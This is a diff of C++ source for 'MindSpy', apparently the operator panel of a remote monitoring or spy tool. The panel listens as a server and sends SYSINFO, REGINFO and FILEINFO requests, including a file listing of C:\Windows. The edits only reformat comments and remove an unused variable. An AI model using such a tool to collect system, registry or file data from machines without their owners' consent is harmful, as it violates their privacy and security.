@@ -11,7 +11,8 @@ namespace MindSpy
 {
 	int CPanel::TipoComando(const char*c)
 	{
-		const int CANTIDAD_COMANDOS = 5; // Cantidad de comandos disponibles
+		//! Cantidad de comandos disponibles
+		const int CANTIDAD_COMANDOS = 5; 
 		// Arreglo de comandos
 		char ComandosInternos[CANTIDAD_COMANDOS][16] = { "ALIAS", "ENVIAR", "SYSINFO", "REGINFO", "FILEINFO" };
 		// Recorremos el arreglo en búsqueda de un comando existente.
@@ -26,12 +27,15 @@ namespace MindSpy
 
 	void CPanel::Run()
 	{
-		stringstream str; // Almacena el comando entero para separarlo
-		string Comando, Op1, Op2; // Guarda el comando en bruto (leido desde el stream)
-		char Mensaje[4096];	// Guarda el comando leido desde el stream
+		//! Almacena el comando entero para separarlo
+		stringstream str; 
+		//! Guarda el comando en bruto (leido desde el stream)
+		string Comando, Op1, Op2; 
+		//! Guarda el comando leido desde el stream
+		char Mensaje[4096];	
+		//! Crea e inicia el servidor
+		Servidor c; 
 
-		Servidor c; // Crear e iniciar el servidor
-		int SizeOpcode;
 		// Iniciar la escucha del servidor
 		if (c.Listo()) c.IniciarEscucha();
 		while (true) {
@@ -80,7 +84,7 @@ namespace MindSpy
 				break;
 
 			case INTERNOS_CMDS::REQ_FILEINFO: {
-				// Crear una nueva estructura para el pedido y llenarla
+				//! Crea una nueva estructura para el pedido y llenarla
 				stFileInfoRequest stfir;
 				wcsncpy(stfir.Filtro, L"*.*", 4);
 				wcsncpy(stfir.Path, L"C:\\Windows", 11);
